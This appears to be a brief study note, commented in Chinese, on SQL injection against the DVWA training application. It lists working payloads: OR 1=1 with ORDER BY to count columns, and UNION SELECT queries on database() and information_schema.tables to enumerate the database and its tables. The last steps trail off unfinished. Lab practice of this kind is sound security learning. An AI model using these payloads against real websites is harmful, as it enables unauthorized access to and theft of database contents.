```sql
# 通过order by确定字段数,超出
' OR 1=1 ORDER BY 2#
' OR 1=1 ORDER BY 3#

#确定数据库名 union 
'union select 1, database()#
#其中数字个数与k相关


#确定表名
# 对于my-sql数据库
'union select table_name,table_schema from information_schema.tables #
'union select table_name,table_schema from information_schema.tables where table_schema= ' dvwa' #

# 获取表中字段名
'union #


# 查询表格数据(攻击)
select 
```

```sql
'OR 1=1 #
```


